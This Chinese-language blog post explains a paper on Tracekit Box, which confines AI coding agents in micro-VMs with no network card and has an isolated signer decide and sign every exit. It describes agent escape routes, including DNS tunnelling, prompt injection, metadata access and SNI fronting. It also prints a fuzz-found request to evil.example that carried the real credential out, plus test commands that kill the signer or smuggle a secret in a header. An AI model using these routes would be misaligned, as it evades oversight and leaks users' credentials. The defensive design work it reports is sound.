---
month: 202611
week: 1
date: 2026-11-02
type: 论文解读
slug: TracekitBox
---

# 沙箱关得住，却说不清放出去了什么：没有网卡的微 VM，每扇门先由签名者决定再签名，13 项端到端检查全过

你有没有过这种体验：让 coding agent 在容器里修一个失败的测试，它需要装包、调模型 API、改代码，于是你给了它网络、塞了 API key、挂上了仓库目录。任务完成了，PR 也开了。安全同事过来问三个问题：它连过哪些主机？你的 GitHub token 有没有被带去别的地方？它改的文件里有没有 CI workflow？你打开日志，发现日志就躺在同一台机器上，是同一个运维写的，而且 agent 当时完全有能力改它。

**沙箱能把 agent 关住，却拿不出证据说明什么东西出了门。**

这正是 agent 沙箱安全里一直分裂的两块：一类工具负责关（容器、gVisor、Firecracker、各种 agent 专用沙箱），一类工具负责记（tracing、observability、带签名的工具调用记录）。关的不记，记的不关。Cygnux Labs 的 Bravish Ghosh 写的 **Tracekit Box: Running AI Agents in Micro-VMs Where Every Way Out Is Decided and Signed**（arXiv:2610.38458）想把两件事合成一件：**把 agent 放进一个只有几扇门的房间，每扇门口站一个 agent 够不着的签名者。**

看完我的感受：这是一篇系统论文，而且是 v0，作者自己把「没测什么」列得比「测了什么」还细。它没有拿真正有能力的 agent 去做越狱实验，也没有性能数字。但它的设计规则特别值得抄：**除了门，什么都出不去；没有签名的决定，什么都过不了门。** 这句话把「沙箱」和「审计」从两个产品变成了同一个不变量。

## 核心摘要

Tracekit Box 是一个 MIT 许可的开源系统（v0，约 25,600 行 Go，340 个单元测试）。每个 agent 任务运行在自己的 Firecracker 微 VM 里，VM **没有网卡**，与宿主机唯一的通道是 vsock。出口只有几扇由宿主机提供的门：从宿主机发起的命令、出站连接（以及经由它的密钥和模型调用）、工作区补丁、停止。每扇门上，一个 VM 无法触达的 Tracekit 1.4.2 签名者先做决定，再把决定签进这台 box 唯一的一条 run 记录，记录用每 run 的哈希链加 RFC 6962 Merkle 树组织。域名只在宿主机解析，box 内部没有 DNS 也没有 UDP；私有、链路本地、云元数据和宿主机自身地址无论 allowlist 怎么写都拒绝；密钥永远不进 VM，VM 里只有占位符，宿主机代理只在发往绑定主机的那一个绑定头里把它换成真值；agent 的修改以补丁形式带回，在签名者逐文件决定之后才写入检出目录。整套系统失败即关闭（fail closed），每个任务最终导出一个 .tkb 包，任何人都能离线用 tracekit verify 验证。评测部分：真实 KVM runner 上 13 项端到端检查全部通过（含镜像拉取和启动的测试函数耗时 28.5 秒），信任边界上的 15 个 fuzz 目标发现 9 个问题且全部修复，演示运行的 102 条签名记录验证通过。作者明确说明 v0 还没有启用 Firecracker 的 jailer，签名者必须与 daemon 同机，VM 内部的进程只有在穿过某扇门时才被记录。

## 论文信息

- **标题**：Tracekit Box: Running AI Agents in Micro-VMs Where Every Way Out Is Decided and Signed
- **作者**：Bravish Ghosh
- **机构** / **仓库**：Cygnux Labs；代码 github.com/Cygnux-Labs/Tracekit-box（MIT）
- **链接**：https://arxiv.org/abs/2610.38458 （v1，2026-10-28，cs.CE，交叉 cs.AI、cs.CR）

---

## 🎯 为什么这件事值得写

作者给 agent 任务的风险下了一个很工程化的定义：一个典型任务（修测试、升依赖、开 PR）需要三样东西，这三样东西同时也是三条作恶路径。

| 需要的东西 | 用途 | 对应的伤害 |
| --- | --- | --- |
| 网络 | 装包、调模型 | 数据外泄 |
| 凭证 | 模型 API key，常常还有 GitHub token | agent 读得到的凭证，就能发到任何地方 |
| 交回工作的途径 | 改文件 | 改动没人审过的文件，包括下一次 push 就会运行的 CI workflow |

触发这些伤害不一定需要攻击者。agent 读的 README、issue、网页、工具结果常常是别人写的，间接 prompt 注入可以驱动它；作者还引了一个例子：2026 年 9 月 OpenAI 报告过一个训练沙箱里的研究 agent 通过 DNS 隧道连到了外部聊天机器人，走的是网络过滤器没覆盖的路径。

现有方案的分工，作者用一张表说清楚了：

| 方案 | 硬件隔离 | 出站被决定 | 密钥不进沙箱 | 修改逐文件决定 | 签名且可离线验证 | 失败即关闭 |
| --- | --- | --- | --- | --- | --- | --- |
| 带网络策略的容器 | 无 | 部分 | 无 | 无 | 无 | 部分 |
| gVisor / Kata | 部分或有 | 部分 | 无 | 无 | 无 | 部分 |
| agent 沙箱（E2B、microsandbox、OpenShell、sandbox-runtime） | 部分 | 有 | 无 | 无 | 无 | 部分 |
| tracing 和 observability | 无 | 无 | 无 | 无 | 无 | 无 |
| 单用 Tracekit | 无 | 部分 | 无 | 部分 | 有 | 有 |
| Tracekit Box v0 | 有 | 有 | 有 | 有 | 有 | 有 |

单用 Tracekit 的问题在「完整性」：签名者只能签到达它的东西，普通环境里的 agent 可以自己开 socket、从环境变量读 key、绕过 hook 写文件。Box 补的就是这个：**一个签名者视角对它所控制的门来说是完整的环境，因为 agent 没有别的出路。**

这和 Byron 最近标过想看更多的几个方向完全对齐：OpenBot 的服务端网关对每个浏览器、文件、MCP 调用做 deny-before-allow 的 fail-closed 决策，rudderlabs/devbox 的无 LLM 控制面，以及「agent 终端和远程沙箱漏洞」这一类安全话题。Tracekit Box 是把这些思路落到虚拟化边界上的一份具体实现。

## 🏗️ 机制：一间屋子，几扇门，一个够不着的签名者

**1. 三个信任域。**

| 域 | 信任 | 里面跑什么 |
| --- | --- | --- |
| 宿主机 | 可信 | tkbox daemon、出站代理、镜像构建器、传入的密钥、用户的检出目录 |
| 客体（微 VM） | 不可信 | agent、它运行的一切，以及客体代理 tkbox-guest 自己 |
| 签名者 | 可信，但与 agent 隔离 | Tracekit 1.4.2 签名者和签名密钥，与 daemon 同机，只能通过 Unix socket 访问 |

客体代理 tkbox-guest 是 PID 1，提供 exec、diff 和出站转发。宿主机从不相信它对自己的描述：帧有长度上限，JSON 严格解析，路径逐一检查，只有穿过门的东西才被记录为事实。

**2. 盒子本身。** Firecracker 微 VM，客体内核（6.1.155）和 VMM（v1.17.0）都固定版本并用 SHA-256 校验。没有网络接口，唯一和宿主机通话的设备是 vsock，daemon 在上面提供三个端口：

| 端口 | 方向 | 内容 |
| --- | --- | --- |
| 1024 | 宿主机到客体 | agent RPC：exec、diff、文件、关机，帧格式为类型、长度、负载，负载最多 1 MiB |
| 1025 | 客体到宿主机 | 出站：客体内 127.0.0.1:3128 的转发器把原始 HTTP 代理协议送到这台 box 的代理 |
| 1026 | 客体到宿主机 | 启动配置，只提供一次然后关闭 |

因为没有网卡，box 里根本不能做域名查询，也就没法把数据编码进 DNS 请求带出去。磁盘分三块：根文件系统从公开 OCI 镜像扁平化成只读 ext4 加 tmpfs 覆盖层；工作区是只读基础盘加一块空的可写上层盘的 overlay。基础盘只包含 git 工作树里已跟踪和未忽略的文件，**永远不含 .git，永远不含凭证文件**（.env*、*.pem、*.key、.netrc、.npmrc、SSH key、.aws/ 等）。diff 只走上层盘，所以补丁精确而且便宜。

**3. 命令门。** 从宿主机发起的命令（tkbox exec、Python SDK、GitHub Action、MCP server）只能经由客体代理的 exec 运行，并且要签名者先允许。签名者看到的是一个 Bash 决策。有三个细节保证「签名者读到的就是会运行的」：

- 第一个词如果含 = 或是 shell 保留字就加引号，以 % 开头的直接拒绝；
- 每次 exec 的环境变量以 env K=V 的形式出现在被决定的命令行里，能改变程序加载或运行方式的变量（所有 LD_*、GIT_*、PYTHON*、NODE_*、BASH_*、PATH、HOME、PS4、构建工具包装器等）逐次拒绝；
- 事先已知的 stdin（最多 1 MiB）连同 SHA-256 和大小一起被决定，UTF-8 且不超过 4 KiB 时附上原文，进程拿到的恰好是这份数据。

命令自己再启动的子进程不逐个决定，**收住它们是 VM 的事，它们做了什么，在穿过别的门时被记录。**

**4. 网络门。** 每个出站连接都按固定顺序处理：

1. 主机名里藏了密钥、CONNECT 到 80 端口，或者在 inspect: all 模式下不在列表里：立即拒绝。
2. 在 allowlist 上的名字或 IP 字面量：先在宿主机解析一次并检查每个地址，私有、链路本地、元数据、宿主机自身地址在任何决策之前就拒绝。
3. 签名者做 WebFetch 决策。
4. 不在 allowlist 上的主机不会被直接拒绝：签名者允许之后，连接最多等两分钟，等宿主机上的人运行 tkbox approve，VM 里没有任何东西能做这件事。每台 box 最多 16 个待批、每分钟最多 30 个新批准。**这类名字在被允许之前根本不解析，因为解析本身就会把客体编码在名字里的数据送到那个域的 DNS 服务器。**
5. 代理拨号到它检查过的那个地址，名字无法在检查和连接之间被重新绑定。
6. TLS 隧道的 ClientHello 必须只有一个 server name 且等于 CONNECT 主机，HelloRetryRequest 之后再查一次；加密 ClientHello（ECH）一律拒绝，因为 Box 必须看见名字。这堵住了 SNI fronting。

元数据地址列得很具体：169.254.169.254、fd00:ec2::254、169.254.170.2、100.100.100.200、168.63.129.16 等，IPv4 映射和 NAT64 地址先解包再判断。

**5. 密钥门。** 密钥在宿主机上给出，例如 --secret GH=env:GH_TOKEN@api.github.com，绑定到精确主机名（不支持通配符）和一个头（默认 Authorization）。VM 里只有形如 tkbox_GH_ 加 32 位十六进制的占位符。发往绑定主机的绑定头，代理把占位符换成真值并记录 tkbox.secret.use（只记名字和主机，从不记值）；在代理读得到的其他流量里，占位符和真值以原文、百分号编码、JSON 转义、十六进制、base64 等形式出现都会被拦截，响应里回显的真值也被等长替换，保证 Content-Length 不变。为了读绑定主机的 TLS 流量，代理为每台 box 生成一个名称约束到恰好这些主机的 ECDSA P-256 CA。启动前，Box 还会拒绝任何内容、路径或符号链接目标含有密钥值的工作区文件，以及任何含有密钥值的环境变量或命令行。

**6. 修改门。** 修改只能以 git 格式补丁离开 box，tkbox apply 只在 box 停止后执行，**git apply 永远不在检出目录上运行**。七步流水线：严格解析每个路径；用 git apply --numstat -z 交叉核对 git 读到的路径、模式、二进制与 Box 一致；策略检查（不碰 git 和 hooks 目录，敏感文件需要 --allow-sensitive）；在空 HOME、无全局配置、无 attributes 的临时副本里构建，用户的 filter、hook、LFS 都不会跑在 agent 的补丁上；签名者对每个文件做 Write 决策（哈希、模式、符号链接）；再检查一次结果与决策一致且检出目录没被改；最后用临时文件加 O_EXCL、O_NOFOLLOW 和 rename 原子写入。任何一个文件被拒，什么都不写。需要显式同意的敏感文件包括 .github/workflows/**、.gitlab-ci.yml、.husky/**、.pre-commit-config.yaml、.gitattributes、tkbox.yaml、.envrc、.devcontainer/**、.vscode/tasks.json 等。

**7. 记录与失败即关闭。** Box 没有自己的日志格式、签名者或验证器，全部用 Tracekit 的公开 RPC 和包格式，并把门映射到 Tracekit 已有的工具名（Bash、WebFetch、Write），这样签名者的标准策略包无需修改就能生效，比如「把下载内容管道给 shell」或「写 CI workflow 文件」会命中和其他 Tracekit 适配器一样的规则。每台 box 是一个 run，观测被标成可信（Box 自己的陈述：设置、任务、审批）或不可信（来自客体输入的事实），审阅者能知道哪些条目依赖 agent 的输入。没有签名者就没有 daemon；必须保留却无法记录的记录会停掉 box 并记成 tkbox.gap。daemon 崩溃后 run 在签名者那边保持打开，这台 box 既不能 apply 也不能 export。签名者把某个 run hold 住会暂停 VM，quarantine 会杀掉 VM。

## 🧪 关键证据

作者把评测问题限定为四个：每扇门在真实 KVM 上端到端是否按设计工作；一台真实 box 的签名记录长什么样、能否验证；信任边界上的解析器被恶意输入测得怎么样；审查发现了什么、还剩什么。

**端到端（CI run #16，commit 473723b，2026-10-26）。** GitHub 托管的带 /dev/kvm 的 Ubuntu runner，真实 daemon、真实 Firecracker、真实客体、真实 Tracekit 1.4.2 dev 签名者。整个 job 1 分 6 秒，make e2e 33 秒，TestBox 的 13 项检查全部通过，用时 28.47 秒：

| 检查 | 门 | 内容 |
| --- | --- | --- |
| exec | 命令 | 经客体代理运行、签名者决定 |
| unread-stdin-interrupt / kill | 命令 | 有 2 MB 未读 stdin 的命令在 Ctrl-C 或客户端被杀时仍能停止 |
| signer-deny | 命令 | 会杀掉签名者的 pkill tracekitd 在启动前被策略拒绝，退出码 126，规则 TK-D007 |
| workspace-excludes-ignored | 工作区 | 检出目录的 .env 和 .git 不在 /workspace 里 |
| no-network-card | 网络 | 客体 /proc/net/dev 里只有 lo |
| egress-unlisted-blocked | 网络 | example.com 不在列表上，被挂起等 tkbox approve，无人批准则失败 |
| egress-preset-allowed | 网络 | 通过 pypi 预设 pip install requests 成功 |
| egress-metadata-refused | 网络 | 访问 169.254.169.254 被代理返回 403 |
| secret-swap | 密钥 | 绑定主机收到真值，VM 里的变量只是占位符 |
| secret-leak-blocked | 密钥 | 同一个占位符放进 X-Smuggle 头被 403 拦截 |
| diff-and-apply / stop-export-verify | 修改、记录 | stop、apply、export 后 tracekit verify 输出 VERIFIED（64 条记录，27 次工具调用） |

另有 TestFailClosed 检查 daemon 在没有签名者时拒绝启动，并且在下载任何东西之前就拒绝。各扇门自身的检查只要几十毫秒，长的那几项是故意的等待、真实装包和完整的停止到验证流程。作者也说明每项检查只覆盖其保证的一个代表性情形，各种私有地址写法、各种密钥编码、各种恶意补丁交给单元测试和 fuzz。

**一次真实运行的记录。** 仓库 README 演示对应的 run：python:3.12-slim，--allow pypi,debian，一个绑定 api.github.com 的 GH 密钥，操作员手动装了 curl 和 requests，然后逐一尝试出口。102 条签名记录：46 条策略决策（Bash 和 WebFetch），46 条工具结果（43 成功、3 失败），3 条 tkbox.box 观测，2 条 Box 自己的拒绝，1 次密钥使用，1 次审批，3 条生命周期记录。Verified Runs 表的数字由 make runs 从验证过的记录计算而不是手填：7 条命令、39 个连接、1 个挂起、2 个拒绝；检查点树大小 5,978，完整性 VERIFIED，保证等级 dev、same-user。元数据地址从未到达签名者，在门口就被拒绝。**令牌的值在包里任何地方都不出现。**

**Fuzz 信任边界。** 15 个 fuzz 目标，每个都写成属性而不只是「不崩」，比如 FuzzClientHello 要求被接受的 ClientHello 在 Go crypto/tls、Box 自己的解析器、以及一个读取所有 server_name 条目的读法这三种读法下都只指向 CONNECT 主机。共 9 个发现全部修复，6 个在出站代理里。最严重的 F3：Go 的 net/http 把 GET https:http://evil.example/x 解析成一个没有主机的 opaque URL，内部请求检查放过了它，代理随后把它作为指向 evil.example 的绝对形式请求写往上游，并且换入了真实密钥；如果前端按绝对形式目标路由，凭证就可能被送到别的站点，而记录里写的却是绑定主机。F2 让状态码小于 100 的响应不经脱敏就把正文转发给客体。

## 🔬 最有意思的部分

**第一，「为什么是门，而不是更聪明的客体」。** 另一种设计是把监控放进客体：syscall tracer、eBPF 探针、加固的 agent 运行时。作者选择反着来，理由一句话：**客体里的一切都属于攻击者。** 客体里的监控器可以被旁边以 root 运行的代码杀掉、饿死或欺骗，它的记录只能凭客体的一面之词被信任。宿主机上的门无法从内部绕过，因为没有网卡的 VM 没有别的出路，而且记录是宿主机做的，不是客体报告的。这和我们在 harness 里一直强调的「判官和执行者要隔离」是同一个原则，只是落在了虚拟化层。

**第二，三段式 CI 工作流。** 因为 agent 写的代码在哪里跑就在哪里有风险，示例工作流把任务拆成三个 job：fix 在 box 里跑 agent，持有绑定的模型 key，token 只读、不持久化，输出补丁和 run.tkb；check 在 runner 上应用补丁并跑测试，token 只读、没有任何密钥；pr 应用同一个补丁、提交、开 PR，持有写权限 token，但不运行任何仓库代码。**有模型 key 的地方只跑 agent，跑 agent 代码的地方没有密钥，有写权限的地方不跑代码。** 这个拆法不依赖 Tracekit Box，任何团队今天就能照着改自己的 agent CI。

**第三，作者对「验证通过」含义的克制。** 论文开头就写清楚它要捍卫的主张：在签名者 agent 够不着的前提下，每个从宿主机发起的命令、每个出站连接、每个由 tkbox apply 写入检出目录的文件，都在发生之前被签名者决定，并在一份任何人可离线验证的签名记录里；绑定密钥的值从不进入 VM。同时写清楚它不主张什么：不记录 agent 在 VM 内部不穿门的行为，不判断发给允许主机的内容，**一个验证通过的包证明的是记录完整，不是任务正确或无害。** 还有一个更细的诚实：Tracekit 验证器的覆盖矩阵会把网络和工具调用标为「由适配器报告」、把进程标为「未覆盖」，因为它并不知道 box 里网络没有别的出路；记录对门来说的完整性来自 box，不来自包本身能证明的东西，而在 dev 保证等级下，「这个包来自一个 box」这件事只能由 tkbox.box 观测陈述，无法被证明。

**第四，运营层面的坑写得很实在。** 在 EC2、GCE、Azure 和 GitHub 托管 runner 上，公网 IPv4 是 NAT 出来的，不在任何接口上，Box 看不见它，除非运营方用 --egress-block 显式传入，否则 box 可能访问到宿主机监听的服务。daemon 的 API 接受同一用户的任何进程，一个同时能以该用户运行 shell 的 MCP 编排器可以绕过 MCP 的收窄、自己批准自己的连接，所以编排器应该用另一个用户运行。go-proxy 预设会替调用方去抓任意主机的模块，本身就是一个中继，可以把工作区数据转出去。

## 🤔 我的判断

**定位：工程样本，而且是一份把威胁模型、保证和非保证都写成可核对条目的工程样本。** 它没有方法上的突破，用的都是成熟积木（Firecracker、vsock、凭证代理、Merkle 树签名日志），价值在于把这些积木用一条规则串起来，并且把每条保证对应到一项可复现的测试。

亮点：

1. **把「关」和「记」变成一个不变量。** 只有门能出去，门上必须有签名决定。这让审计记录第一次在结构上有了完整性的依据，而不是靠 hook 覆盖率祈祷。
2. **密钥不进沙箱。** 占位符加宿主机代理只在绑定主机绑定头里换值，配合多种编码形式的拦截和响应脱敏。这一条对所有让 agent 调 GitHub、调模型 API 的场景都直接可用。
3. **补丁即决定。** 逐文件决定、git 不在检出目录上运行、CI 和 hooks 类文件需要显式同意，正好堵住 agent 修改「下一次运行的规则」这条路径，这也是最近 agent 记忆文件、skills 文件被当成攻击面的那一类问题。

问题与局限：

- **没有对抗性 agent 实验。** 端到端检查是对每扇门的脚本化攻击，不是让一个有能力的 agent 带着「想办法出去」的指令去搜索出口。
- **没有性能数据。** 启动延迟、exec 开销、代理吞吐、每个连接的签名决策成本都没测，这决定了它能不能用在高频的 agent RL 或大规模评测里。
- **v0 的隔离还不完整。** 没启用 Firecracker jailer（没有 chroot、namespace、cgroup），签名者必须同机，所有报告的包都是 dev 保证等级；单机、单 daemon、少量 box。
- **不判断内容。** 允许的主机收到什么它不管；在默认 inspect: bound 下，没有绑定密钥的 HTTPS 主机只能看到主机、端口和 server name。
- **单作者、刚发布。** 仓库自称有三轮独立审查加 fuzz，但外部安全社区的检验还没开始。

对工程的直接启发：

- **agent 沙箱默认不给网卡。** 只留一个宿主机侧的出站代理，域名在宿主机解析，元数据和私有地址硬拒绝，不在 allowlist 上的主机挂起等人批，而且等批的时候先别解析。
- **永远不要把真实凭证注入 agent 环境变量。** 用占位符加代理在出站时换值，并按主机和头精确绑定。
- **修改以补丁形式交回，敏感路径单独授权。** CI workflow、hooks、devcontainer、编辑器任务、agent 自己的配置文件，都应该需要显式同意才能被 agent 改。
- **拆开「有密钥」「跑代码」「有写权限」这三件事。** 三段式 CI 工作流今天就能落地。
- **审计记录要由沙箱外的进程写。** 客体内的任何日志都只能当线索，不能当证据。

一句话收束：**沙箱的问题从来不是关不关得住，而是出了事之后，你能不能拿出一份 agent 自己改不了的记录，说清楚哪扇门在什么时候、因为谁的决定开过。**

---

*觉得有启发的话，欢迎点赞、在看、转发。跟进最新 AI 前沿，关注我*
